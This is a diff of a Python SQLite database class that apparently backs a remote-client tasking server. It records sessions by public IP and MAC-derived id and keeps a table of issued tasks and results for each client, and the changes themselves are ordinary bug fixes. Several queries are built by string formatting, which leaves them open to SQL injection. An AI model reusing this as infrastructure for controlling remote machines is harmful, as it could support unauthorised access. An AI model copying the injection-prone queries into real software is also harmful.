@@ -48,7 +48,7 @@ COMMIT;
         :param str database:    name of the persistent database file
 
         """
-        super(Database, self).__init__(database)
+        super(Database, self).__init__(database, check_same_thread=False)
         self.row_factory = sqlite3.Row
         self.text_factory = str
         self._database = database
@@ -67,7 +67,7 @@ COMMIT;
                         j = json.loads(v.encode())
                         self._display(j, indent+2)
                     except:
-                        util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
+                        util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end=',')
                         util.display(str(v).encode(), color=c, style='dim')
                 elif isinstance(v, list):
                     for i in v:
@@ -81,20 +81,20 @@ COMMIT;
                     self._display(v, indent+1)
                 elif isinstance(v, int):
                     if v in (0,1):
-                        util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
+                        util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end=',')
                         util.display(str(bool(v)).encode(), color=c, style='dim')
                     else:
-                        util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
+                        util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end=',')
                         util.display(str(v).encode(), color=c, style='dim')
                 else:
-                    util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
+                    util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end=',')
                     util.display(str(v).encode(), color=c, style='dim')
         elif isinstance(data, list):
             for row in data:
                 if isinstance(row, dict):
                     self._display(row, indent+2)
                 else:
-                    util.display(str(row).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
+                    util.display(str(row).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end=',')
                     util.display(str(v).encode(), color=c, style='dim')
         else:
             try:
@@ -107,18 +107,23 @@ COMMIT;
                 util.display(str(i).rjust(indent-1), color='reset', style='bright') if i else None
                 self._display(data, indent+2)
             else:
-                util.display(str(data.encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end=''))
+                util.display(str(data.encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end=','))
                 util.display(v.encode(), color=c, style='dim')
 
     def _client_sessions(self, uid):
         for i in self.execute('select sessions from {} where uid=:uid'.format(self._tbl_sessions), {"uid": uid}):
             if isinstance(i, int):
                 return i + 1
+        else:
+            return 1
+
 
     def _count_sessions(self):
         for i in self.execute('select count(*) from {}'.format(self._tbl_sessions)):
             if isinstance(i, int):
                 return i + 1
+        else:
+            return 1
 
     def debug(self, output):
         """ 
@@ -170,9 +175,10 @@ COMMIT;
         :param bool display:    display output
 
         """
-        statement = "select * from {}" if verbose else "select id, public_ip, uid, last_online from {}"
-        rows = self.execute(statement.format(self._tbl_sessions))
-        return [{k:v for k,v in zip([row[0] for row in rows.description], client)} for client in rows.fetchall()]
+        sql = "select * from {}" if verbose else "select id, public_ip, uid, last_online from {}"
+        statement = self.execute(sql.format(self._tbl_sessions))
+        columns = [_[0] for _ in statement.description]
+        return [{k:v for k,v in zip(columns, rows)} for rows in statement.fetchall()]
 
     def get_tasks(self, session=None, display=True):
         """ 
@@ -202,22 +208,23 @@ COMMIT;
         Returns the session information as a dictionary (JSON) object
         """
         if isinstance(info, dict):
-            if 'id' not in info:
+            if not info.get('id'):
                 info['id'] = self._count_sessions()
-            if 'uid' not in info:
+            if not info.get('uid'):
                 info['uid'] = md5.new(info['public_ip'] + info['mac_address']).hexdigest()
                 info['joined'] = datetime.datetime.now()
             info['online'] = 1
             info['sessions'] = self._client_sessions(info['uid'])
             info['last_online'] = datetime.datetime.now()
             if self.exists(info['uid']):
-                self.execute_query("update {} set online=:online, sessions=:sessions, last_online=:last_online".format(self._tbl_sessions), params=info, returns=False)
+                self.execute_query("update {} set online=:online, sessions=:sessions, last_online=:last_online where uid=:uid".format(self._tbl_sessions), params=info, returns=False)
             else:
         	    self.execute_query("insert into {} ({}) values (:{})".format(self._tbl_sessions, ','.join(info.keys()), ',:'.join(info.keys())), params=info, returns=False, display=False)
         	    self.execute_query("create table '{}' (id serial, uid varchar(32), task text, result text, issued DATETIME, completed DATETIME)".format(info['uid']), returns=False, display=False)
-            for row in self.execute("select * from {} where uid=:uid".format(self._tbl_sessions), {"uid": info['uid']}).fetchone():
+            for row in self.execute("select * from {} where uid=:uid".format(self._tbl_sessions), info):
         	    if isinstance(row, dict):
         	        info = row
+                    break
             self.commit()
             return info
         else:
@@ -271,8 +278,9 @@ COMMIT;
             result.append(row)
             if display:
                 self._display(row)
-	    if returns:
-	        return result
+        self.commit()
+        if returns:
+            return result
 
     def execute_file(self, filename=None, sql=None, returns=True, display=False):
         """ 
